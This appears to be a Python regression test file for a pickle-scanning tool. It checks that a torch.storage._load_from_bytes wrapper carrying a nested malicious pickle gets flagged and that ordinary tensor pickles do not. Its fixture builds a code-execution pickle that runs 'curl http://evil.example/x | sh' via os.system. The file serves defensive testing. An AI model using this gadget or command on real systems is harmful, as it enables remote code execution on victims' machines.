"""Regression tests for the MFV pickle global allow/deny classification.

`torch.storage._load_from_bytes` used to sit in ``PICKLE_ALLOWED_GLOBALS``,
filed alongside the genuinely benign tensor-rebuild helpers. Its entire body
is a nested *unrestricted* load:

    def _load_from_bytes(b):
        return torch.load(io.BytesIO(b), weights_only=False)

so a pickle whose GLOBAL references it is a self-contained code-execution
gadget: the real payload is a second pickle carried inline as the literal
bytes argument, which the opcode walker never descends into. Being on the
allow list meant such a file produced *no* finding at all -- not even the
INFO-tier MFV-PICKLE-004 unknown-globals finding, which is the floor for
anything unrecognized. PyTorch's own ``weights_only`` allowlist deliberately
excludes this callable, so the scanner was more permissive than the loader it
models.

The fixtures are hand-built protocol-4 streams (same approach as
test_mfv_pickle_reduce.py) so the suite stays independent of whether torch
is installed in the test environment.
"""

from __future__ import annotations

import pickle

from hayward.findings import Severity
from hayward.scanner import (
    ModelFileScanner,
    _classify_pickle_global,
)


class _InnerPayload:
    """The nested pickle smuggled inside the bytes argument. Never reached by
    the outer walk -- it exists to show what `_load_from_bytes` would hand to
    an unrestricted `torch.load`."""

    def __reduce__(self):
        import os
        return (os.system, ("curl http://evil.example/x | sh",))


def _load_from_bytes_pickle_bytes(inner: bytes) -> bytes:
    """Hand-built protocol-4 stream: resolve `torch.storage._load_from_bytes`
    via STACK_GLOBAL and REDUCE it with `inner` as a literal bytes argument.

    This is byte-for-byte the shape a plain `pickle.dumps(some_tensor)`
    produces -- torch's `UntypedStorage.__reduce__` returns
    `(_load_from_bytes, (buf.getvalue(),))` -- except that here the blob is
    an attacker's pickle rather than serialized tensor data. Nothing in the
    outer stream distinguishes the two."""
    assert len(inner) < 256, "fixture relies on SHORT_BINBYTES"
    return (
        b"\x80\x04"
        + b"\x8c\x0dtorch.storage\x94"     # SHORT_BINUNICODE 'torch.storage' + MEMOIZE
        + b"\x8c\x10_load_from_bytes\x94"  # SHORT_BINUNICODE '_load_from_bytes' + MEMOIZE
        + b"\x93\x94"                       # STACK_GLOBAL + MEMOIZE -> the ref
        + b"C" + bytes([len(inner)]) + inner + b"\x94"  # SHORT_BINBYTES + MEMOIZE
        + b"\x85\x94"                       # TUPLE1 + MEMOIZE -> (inner,)
        + b"R\x94"                          # REDUCE + MEMOIZE -> the nested load
        + b"."                              # STOP
    )


class TestLoadFromBytesIsJudgedByItsPayload:
    """`torch.storage._load_from_bytes` is `torch.load(BytesIO(b))`: the whole
    payload lives in the bytes literal `b`.

    It used to be denied by name, because the walker could not see inside that
    literal and the deny was the only way to see it at all. MFV-PICKLE-008 now
    walks bytes literals, so the call is judged by what it actually carries.

    That is strictly more informative: the finding names `posix.system`, the
    real sink, instead of naming the wrapper. It also stopped 115 of
    SafePickle's 644 benign models being flagged, because plain-pickling any
    tensor emits this call.
    """

    def test_payload_is_still_critical(self, tmp_path):
        inner = pickle.dumps(_InnerPayload(), protocol=4)
        p = tmp_path / "payload.pkl"
        p.write_bytes(_load_from_bytes_pickle_bytes(inner))

        findings = ModelFileScanner().scan_file(p)
        critical = [f for f in findings if f.severity == Severity.CRITICAL]
        assert critical, [(f.rule_id, f.message[:70]) for f in findings]
        assert any(f.rule_id == "MFV-PICKLE-008" for f in critical)

    def test_the_finding_names_the_real_sink(self, tmp_path):
        """The point of judging by payload: say what is actually in there."""
        inner = pickle.dumps(_InnerPayload(), protocol=4)
        p = tmp_path / "payload.pkl"
        p.write_bytes(_load_from_bytes_pickle_bytes(inner))

        messages = " ".join(f.message for f in ModelFileScanner().scan_file(p))
        assert "system" in messages

    def test_wrapper_without_a_payload_is_not_actionable(self, tmp_path):
        """The regression this fixes: the call around ordinary tensor bytes is
        how PyTorch serialises a plain-pickled storage, and is not a finding."""
        p = tmp_path / "ordinary.pkl"
        p.write_bytes(_load_from_bytes_pickle_bytes(
            pickle.dumps({"weights": [1.0, 2.0, 3.0]}, protocol=4)))

        findings = ModelFileScanner().scan_file(p)
        assert not any(f.severity != Severity.INFO for f in findings), (
            [(f.rule_id, f.message[:70]) for f in findings]
        )


class TestBenignTorchGlobalsStillAllowed:
    """Guard against over-correcting: the tensor-rebuild helpers that a real
    `torch.save` checkpoint emits must stay allowed. Every one of these is
    also on PyTorch's own `weights_only` allowlist."""

    def test_real_state_dict_globals_are_allowed(self):
        # The exact global set emitted by torch.save() of a simple state_dict.
        for ref in (
            "collections.OrderedDict",
            "torch.FloatStorage",
            "torch._utils._rebuild_tensor_v2",
        ):
            assert _classify_pickle_global(ref) == "allowed", ref

    def test_torch_save_shaped_pickle_produces_no_critical(self, tmp_path):
        """A stream referencing only rebuild helpers must not trip
        MFV-PICKLE-001."""
        data = (
            b"\x80\x04"
            + b"\x8c\x0ctorch._utils\x94"
            + b"\x8c\x14_rebuild_tensor_v2\x94"
            + b"\x93\x94"
            + b"0"
            + b"N"
            + b"."
        )
        p = tmp_path / "benign_rebuild.pkl"
        p.write_bytes(data)
        findings = ModelFileScanner().scan_file(p)

        assert not [f for f in findings if f.rule_id == "MFV-PICKLE-001"]
